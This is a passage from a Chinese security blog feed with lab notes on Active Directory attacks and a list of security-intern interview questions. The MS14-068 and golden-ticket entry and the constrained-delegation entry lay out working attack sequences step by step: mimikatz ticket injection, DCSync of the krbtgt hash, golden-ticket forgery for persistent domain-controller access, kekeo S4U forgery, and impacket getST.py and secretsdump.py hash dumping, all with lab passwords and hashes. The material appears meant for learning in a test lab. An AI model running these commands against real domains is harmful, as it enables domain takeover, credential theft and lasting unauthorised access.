class="hljs-number">2.</span>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据<br>    <br><span class="hljs-number">3.</span>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。<br></code></pre></td></tr></table></figure><p><strong>白银票据：有效的票据授予服务（伪造TGS）</strong></p><p><strong>黄金票据：伪造TGT并且有效的获得任何Kerberos服务</strong></p><h5 id="其中MS14-068可用来横向获取域内主机权限，黄金票据、白银票据则可以用来对域控进行权限维持。"><a href="#其中MS14-068可用来横向获取域内主机权限，黄金票据、白银票据则可以用来对域控进行权限维持。" class="headerlink" title="其中MS14-068可用来横向获取域内主机权限，黄金票据、白银票据则可以用来对域控进行权限维持。"></a>其中MS14-068可用来横向获取域内主机权限，黄金票据、白银票据则可以用来对域控进行权限维持。</h5><p><strong>打域控常用ms14-068</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ms14-068.exe -u 域名 -s 域内普通用户的sid -p 域内普通用户的密码</span><br><span class="hljs-comment"># MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\ms14-068.png" alt="ms14-068"></p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\ms14-068_2.png" alt="ms14-068_2"></p><p>这里如果使用<strong>python的ms14-068</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">python ms14-<span class="hljs-number">068.</span>py -u<br>web@hackbox.com -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2005268815</span>-<span class="hljs-number">658469957</span>-<span class="hljs-number">1189185684</span>-<span class="hljs-number">1103</span> -d<br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.149</span> -p !@<span class="hljs-comment">#Qwe456</span><br></code></pre></td></tr></table></figure><p>在这里生成票据后 用<strong>KrbCredExport</strong> 将.ccache文件格式转为<strong>kirbi格式</strong>的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python KrbCredExport.py TGT_web@hackbox.com.ccache user.ticket(可以自己随意命名)</span><br></code></pre></td></tr></table></figure><p>利用<strong>msf和cs中的mimikatz</strong> 注入票据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># kerberos_ticket_use c:\user.ticket </span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\ms14-068_4.png" alt="ms14-068_4"></p><p>利用<strong>mimikatz.exe</strong> 注入票据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># kerberos::ptc (票据)TGT_web@hackbox.com.ccache</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\ms14-068_3.png" alt="ms14-068_3"></p><p>查看当前证书 是否导入</p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\ms14-068_4.png" alt="ms14-068_4"></p><p>可以看出这个是有时间限制的 ，其实就是<strong>白银票据</strong>，只有几个小时时间可以访问域控！！</p><p>删除票据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># klist purge</span><br></code></pre></td></tr></table></figure><p>直接就可以访问域控了</p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\ms14-068_4.png" alt="ms14-068_4"></p><p>现在就开始做黄金票据，永久后门</p><p>上传载荷，使DC上线 (我嫌弃麻烦就把DC机器直接桥接了，DC的IP变为192.168.31.167)</p><p>在msf中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># dcsync_ntlm krbtgt   administrator管理员权限使用</span><br><br><span class="hljs-comment">#   拿到 krbtgt 账户的 sid 和ntlm</span><br></code></pre></td></tr></table></figure><p>在cs中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># dcsync hackbox.com hackbox\krbtgt  </span><br><br><span class="hljs-comment">#   拿到 krbtgt 账户的 sid 和ntlm</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\黄金票据.png" alt="黄金票据"></p><p>在msf中使用生成黄金票据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># golden_ticket_create  -d hackbox.com -u test -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /tmp/krbgtt.ticket</span><br></code></pre></td></tr></table></figure><p>然后清除普通域用户中的票据</p><p>cs和msf 都使用使用如下命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># kerberos_ticket_use （票据位置）/tmp/krbtgtt.ticket  注入票据</span><br></code></pre></td></tr></table></figure><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\黄金票据_2.png" alt="黄金票据_2"></p><p>再次去看票据的时间，时间变为了2032年，就可以长久控制域控了。</p><p><img src="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/hexo\J47erry\source\images\黄金票据_3.png" alt="黄金票据_3"></p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#某某安服实习生面试</title>
    <link href="/2022/06/22/%E6%9F%90%E6%9F%90%E5%AE%89%E6%9C%8D%E5%AE%9E%E4%B9%A0%E7%94%9F%E9%9D%A2%E8%AF%95/"/>
    <url>/2022/06/22/%E6%9F%90%E6%9F%90%E5%AE%89%E6%9C%8D%E5%AE%9E%E4%B9%A0%E7%94%9F%E9%9D%A2%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="某某安服实习生面试"><a href="#某某安服实习生面试" class="headerlink" title="某某安服实习生面试"></a>某某安服实习生面试</h1><p>啊~懒得整理了 发一下技术面（只对岗位分类，公司就不说了）</p><p>自我感觉回答的还OK，面试官也不错，整体面试感觉嘎嘎棒</p><p>拿到小厂offer了，虽然我也没投大厂，还是太菜了</p><h2 id="安服-x2F-渗透"><a href="#安服-x2F-渗透" class="headerlink" title="安服&#x2F;渗透"></a>安服&#x2F;渗透</h2><p>对内网了解到哪里呢？</p><p>是自己搞还是跟着别人一起搞？在团队里面负责干嘛呢？</p><p>打内网主要是用过什么工具？简单说一下</p><p>你打过哪些单位的内网？多吗？</p><p>接触网络安全到现在多久了呀？</p><p>学习是跟学校的人一起？还是什么？</p><p>你学过哪些技能？</p><p>接触过的数据库主要是mysql嘛？除此之外还有什么数据库？</p><p>mysql、mssql以及oracle三个数据库的区别</p><p>mysql数据库里面为什么会有information_schema这个呢？</p><p>了解过嘛？</p><p>大于哪个版本会有这个？</p><p>什么类型的注入点才能写入？这个注入点同时还有支持哪两个注入呢？</p><p>找到绝对路径的方法</p><p>注入报错的时候，程序内部为什么会显示报错</p><p>文件上传你试过哪些呢</p><p>struts2的漏洞了解嘛</p><p>简单说一下对网站测试的一整个思路</p><p>你这边有什么问题想问我的嘛</p><p>对top10哪个漏洞最为熟悉</p><p>sql注入的分类</p><p>绕waf</p><p>mysql的分类</p><p>一次性获取全部数据的注入方式</p><p>mssql注入有了解嘛</p><p>延时注入的语句</p><p>mysql注入和mssql注入拿shell</p><p>文件上传了解嘛</p><p>文件上传传上去了但是403是什么原因</p><p>访问木马文件的时候，没有权限的话怎么突破</p><p>除了web，还有其他了解嘛，内网或者CTF方面</p><p>现在平常有在挖洞嘛</p><p>你以后的打算是什么？学习计划之类的。</p><p>sql注入原理、分类</p><p>防护sql注入</p><p>预编译的原理，预编译一定能防止sql注入嘛</p><p>讲讲堆叠注入</p><p>宽字节注入的原理</p><p>top10漏洞</p><p>讲讲反射性和存储型xss哪个经过服务器</p><p>数据库提权、mysql中的udf提权</p><p>如何横向渗透</p><p>收集的凭证有哪些</p><p>给你一个webshell，如何进行后渗透</p><p>linux系统横向测试</p><p>越权漏洞如何利用</p><p>无源码免杀和有源码免杀的原理</p><h2 id="安开"><a href="#安开" class="headerlink" title="安开"></a>安开</h2><p>（首先说明这个岗位有点不太符合自我的预期，主要工作好像是给各个高校搭建靶场的一些杂事。具体大约问了30分钟，三个人同时问的，好像有点记不全了，大致就这些，自我感觉对工具使用问的挺多）</p><p>熟悉哪个板块？web安全还是逆向啥的</p><p>对于团队内部工作的流程（问的超多超仔细）</p><p>sql注入的种类</p><p>sqlmap自动化注入常见的参数</p><p>burpsuit抓到数据包以后用sqlmap自动化的参数</p><p>windows和linux提权的类型</p><p>内网渗透和域渗透的流程</p><p>常见的报错函数</p><p>你常用的渗透工具</p><p>内网渗透你会用什么工具</p><p>谈谈常用工具的使用和具体用来干什么</p><p>你什么时候能来实习</p><h2 id="hw（蓝队）"><a href="#hw（蓝队）" class="headerlink" title="hw（蓝队）"></a>hw（蓝队）</h2><p>windows创建隐藏账号</p><p>linux隐藏进程</p><p>mssql延时注入怎么快速获取数据</p><p>mysql写shell</p><p>常见中间件漏洞</p><p>常见容器漏洞</p><p>冰蝎加密特征</p><p>mimikatz无法读取明文密码，对方有杀毒软件怎么办</p><p>Linux查看隐藏进程</p><p>快速定位webshell</p><p>windows提权类型</p><p>windows&#x2F;linux的应急流程</p><p>内网快速定位域管</p><p>内网快速定位域控</p><p>一句话木马怎么免杀</p><p>java反序列化的原理，主要是哪种协议</p><p>正向代理和反向代理</p><p>怎么快速检查Linux内文件被更改</p><p>渗透经验，最好是拿到shell</p><p>接触过厂商安全设备没</p>]]></content>
    
    
    <categories>
      
      <category>面经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#约束委派攻击</title>
    <link href="/2022/06/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/"/>
    <url>/2022/06/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>接上述的非约束委派，由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to  Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。</p><p><strong>流程:</strong></p><p><img src="/./images/image-20220109233827841.png" alt="image-20220109233827841"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html">1.用户向Service1发送请求<br><br>2.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。<br><br>3.KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。<br><br>4.Service1在步骤3使用模拟用户申请KDC所获得的ST1票据与User进行验证，然后响应用户的请求。<br><br>注:，但是，S4U2Self扩展不允许Service1去代表用户请求其他服务。<br><br>5.用户再次向Service1发起请求，此时Service1需要以用户的身份去访问Service2.此处官方文档提到了两点。<br><br>A。Service1已经通过验证，并且有一个有效的TGT。<br><br>B。Service1有从用户到Service1的forwardableST（可转发ST），此处我认为，根据流程来看，可转发ST1其实就是ST1，用于(6)的验证<br><br>6.Service1代表用户向Service2请求一个用于认证Service2的ST(称之为ST2)。用户在ST1中通过cname (client name) 和crealm(client name)进行标示。<br><br>7.KDC接收到(6)中的请求后，对PAC的数字签名进行验证。如果验证成功或这个请求没有PAC（无法验证失败）,KDC将返回ST2给service1,不过这个ST2中的cname crealm标示的是用户而不是service1。<br><br>8.service1代表用户使用ST2请求访问Service2<br><br>9.Service2响应Service1的请求<br><br>10.Service1将Service2的响应转发给User。<br></code></pre></td></tr></table></figure><p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p><p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p><h3 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">2019</span><span class="hljs-string">：域控</span><br><span class="hljs-number">2016</span><span class="hljs-string">：域成员</span><br></code></pre></td></tr></table></figure><p>​域控机为域用户配置SPN，用于域用户配置约束委派</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs web-idl">setspn -U -A SQL/test win2016<br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116205432579.png" alt="image-20220116205432579"></p><p>此时在Active Directory 用户和计算机处，可以发现域用户win2016已经可以配置委派了。</p><p>为win2016用户配置约束委派，做win2019机器的cifs服务的委派</p><p><img src="/./images/image-20220116205616253.png" alt="image-20220116205616253"></p><p><img src="/./images/image-20220116205819779.png" alt="image-20220116205819779"></p><p>此时应用设置后，已在域中完成了win2016用户对win2019机器的cifs服务的委派</p><h4 id="发现约束委派"><a href="#发现约束委派" class="headerlink" title="发现约束委派:"></a>发现约束委派:</h4><p>使用Adfind.exe尝试发现约束委派</p><h6 id="查找域中配置约束委派用户"><a href="#查找域中配置约束委派用户" class="headerlink" title="查找域中配置约束委派用户"></a>查找域中配置约束委派用户</h6><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116210212550.png" alt="image-20220116210212550"></p><p>发现win2016用户存在约束委派，委派了win2019机器的cifs服务</p><h6 id="在域中查找配置了约束委派主机"><a href="#在域中查找配置了约束委派主机" class="headerlink" title="在域中查找配置了约束委派主机"></a>在域中查找配置了约束委派主机</h6><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116212912030.png" alt="image-20220116212912030"></p><p>可以看到主机Win2016存在约束委派，委派了域控win2019机器的cifs服务</p><h3 id="攻击利用："><a href="#攻击利用：" class="headerlink" title="攻击利用："></a>攻击利用：</h3><h4 id="域用户存在约束委派"><a href="#域用户存在约束委派" class="headerlink" title="域用户存在约束委派:"></a>域用户存在约束委派:</h4><h6 id="kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">kekeo # tgt::ask /<span class="hljs-keyword">user</span>:win2016 /<span class="hljs-keyword">domain</span>:vulntarget.com /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">Admin</span>#<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116210849880.png" alt="image-20220116210849880"></p><h6 id="kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据</h6><p>利用mimikatz拿到域用户win2016的NTLM hash进行利用</p><p><img src="/./images/image-20220116211127487.png" alt="image-20220116211127487"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">kekeo # tgt::ask <span class="hljs-regexp">/user:win2016 /</span>domain:vulntarget.com /NTLM:dfc8d2bfa540a0a6e2248a82322e654e<br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116211348121.png" alt="image-20220116211348121"></p><h6 id="利用kekeo进行S4U伪造"><a href="#利用kekeo进行S4U伪造" class="headerlink" title="利用kekeo进行S4U伪造"></a>利用kekeo进行S4U伪造</h6><p>利用拿到的TGT票据通过伪造s4u请求以administrator用户身份请求访问域控机的cifs服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tgs::s4u <span class="hljs-regexp">/tgt:TGT_win2016@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /u</span>ser:Administrator@vulntarget.com <span class="hljs-regexp">/service:cifs/</span>win2019.vulntarget.com<br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116211749435.png" alt="image-20220116211749435"></p><h6 id="PTT利用拿到的TGS票据"><a href="#PTT利用拿到的TGS票据" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><p>通过mimikatz进行ptt拿到域控机的cifs服务使用权限</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kerberos::ptt <span class="hljs-title class_">TGS_Administrator</span><span class="hljs-variable">@vulntarget</span>.com<span class="hljs-variable">@VULNTARGET</span>.<span class="hljs-title class_">COM_cifs</span>~win2019.vulntarget.com<span class="hljs-variable">@VULNTARGET</span>.<span class="hljs-title class_">COM</span>.kirbi<br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116211914613.png" alt="image-20220116211914613"></p><p>注:此处使用的通过S4U2proxy 拿到的 TGS票据，而不是使用通过S4U2self拿到的TGS票据。</p><p>查看域控机的共享目录成功！</p><p><img src="/./images/image-20220116212122245.png" alt="image-20220116212122245"></p><h4 id="域主机存在约束委派"><a href="#域主机存在约束委派" class="headerlink" title="域主机存在约束委派:"></a>域主机存在约束委派:</h4><p>通过mimikatz拿到域主机win2016的服务账户NTLM hash来申请可转发的TGT票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>注:需要管理员权限才可拿到密码Hash</p><p><img src="/./images/image-20220116213302798.png" alt="image-20220116213302798"></p><h6 id="kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"><a href="#kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT" class="headerlink" title="kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"></a>kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT</h6><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">tgt::ask /<span class="hljs-symbol">user:</span>win2016<span class="hljs-variable">$ </span>/<span class="hljs-symbol">domain:</span>vulntarget.com /<span class="hljs-variable constant_">NTLM</span><span class="hljs-symbol">:e0cd419213811fd910ca6c3c42d764e7</span><br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116213633756.png" alt="image-20220116213633756"></p><p>注:带有$符号的用户一般都是服务主机账户，而非普通用户</p><h6 id="通过kekeo进行S4U伪造"><a href="#通过kekeo进行S4U伪造" class="headerlink" title="通过kekeo进行S4U伪造"></a>通过kekeo进行S4U伪造</h6><p>如此，成功拿到了对应委派服务的TGS票据</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">kekeo <span class="hljs-comment"># tgs::s4u /tgt:TGT_win2016$<span class="hljs-doctag">@VULNTARGET</span>.COM_krbtgt~vulntarget.com<span class="hljs-doctag">@VULNTARGET</span>.COM.kirbi /user:Administrator<span class="hljs-doctag">@vulntarget</span>.com /service:cifs/win2019.vulntarget.com</span><br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116214205656.png" alt="image-20220116214205656"></p><h6 id="PTT利用拿到的TGS票据-1"><a href="#PTT利用拿到的TGS票据-1" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kerberos::ptt <span class="hljs-title class_">TGS_Administrator</span><span class="hljs-variable">@vulntarget</span>.com<span class="hljs-variable">@VULNTARGET</span>.<span class="hljs-title class_">COM_cifs</span>~win2019.vulntarget.com<span class="hljs-variable">@VULNTARGET</span>.<span class="hljs-title class_">COM</span>.kirbi<br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116214345566.png" alt="image-20220116214345566"></p><p>尝试对域控进行共享目录访问,利用成功！</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\win2019.vulntarget.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116214439465.png" alt="image-20220116214439465"></p><p>注: 此处进行tgs::s4u伪造时，申请的service是cifs&#x2F;win2019.vulntarget.com时；我们在使用时就应该是dir \win2019.vulntarget.com\c$ 这样才能访问成功，若dir \win2019\c$则会访问失败，反之亦然！</p><h3 id="域外利用"><a href="#域外利用" class="headerlink" title="域外利用"></a>域外利用</h3><h5 id="域外使用adfind发现非约束-x2F-约束委派主机或用户时，可使用如下命令"><a href="#域外使用adfind发现非约束-x2F-约束委派主机或用户时，可使用如下命令" class="headerlink" title="域外使用adfind发现非约束&#x2F;约束委派主机或用户时，可使用如下命令:"></a>域外使用adfind发现非约束&#x2F;约束委派主机或用户时，可使用如下命令:</h5><h6 id="在域外探测存在约束委派的域用户账户"><a href="#在域外探测存在约束委派的域用户账户" class="headerlink" title="在域外探测存在约束委派的域用户账户:"></a>在域外探测存在约束委派的域用户账户:</h6><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">AdFind<span class="hljs-selector-class">.exe</span> -h <span class="hljs-number">10.0</span>.<span class="hljs-number">10.110</span> -u vulntarget\win2019 -up admin<span class="hljs-number">#123</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> msDS-AllowedToDelegateTo<br></code></pre></td></tr></table></figure><h6 id="在域外探测存在约束委派的域主机"><a href="#在域外探测存在约束委派的域主机" class="headerlink" title="在域外探测存在约束委派的域主机:"></a>在域外探测存在约束委派的域主机:</h6><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">AdFind<span class="hljs-selector-class">.exe</span> -h <span class="hljs-number">10.0</span>.<span class="hljs-number">10.110</span> -u vulntarget\win2019 -up admin<span class="hljs-number">#123</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot;</span> msDS-AllowedToDelegateTo<br></code></pre></td></tr></table></figure><h5 id="域外通过getST-py进行约束委派攻击"><a href="#域外通过getST-py进行约束委派攻击" class="headerlink" title="域外通过getST.py进行约束委派攻击"></a>域外通过getST.py进行约束委派攻击</h5><p>(可通过隧道，需提前通过hosts文件绑定ip与主机名)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 getST<span class="hljs-selector-class">.py</span> -hashes :b223fae09b86d75482d2c61ac5f773fe -spn cifs/win2019<span class="hljs-selector-class">.vulntarget</span><span class="hljs-selector-class">.com</span> -impersonate administrator vulntarget/win2016$ -dc-ip <span class="hljs-number">10.0</span>.<span class="hljs-number">10.110</span><br></code></pre></td></tr></table></figure><p>-hashes:  NTLM hash</p><p>-spn: 约束委派指定的服务</p><p>-impersonate 伪造的用户 存在约束委派的域主机名</p><p>-dc-ip: dc地址</p><p><img src="/./images/image-20220116221830895.png" alt="image-20220116221830895"></p><p>拿到administrator.ccache</p><p>利用export加载环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=administrator.ccache<br></code></pre></td></tr></table></figure><p>注: KPB5CCNAME 变量名不可变</p><h6 id="利用secretsdump-py-拖取hash"><a href="#利用secretsdump-py-拖取hash" class="headerlink" title="利用secretsdump.py 拖取hash"></a>利用secretsdump.py 拖取hash</h6><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass win2019.vulntarget.<span class="hljs-keyword">com</span> -dc-ip <span class="hljs-number">10.0</span>.<span class="hljs-number">10.110</span><br></code></pre></td></tr></table></figure><p><img src="/./images/image-20220116224843756.png" alt="image-20220116224843756"></p><p>注: 此处使用的cifs服务进行的攻击，若脚本提示认证失败，最大的可能为我们的利用ST票据与攻击应该使用的ST票据不符。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>嘿嘿嘿</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#内网渗透备忘录</title>
    <link href="/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
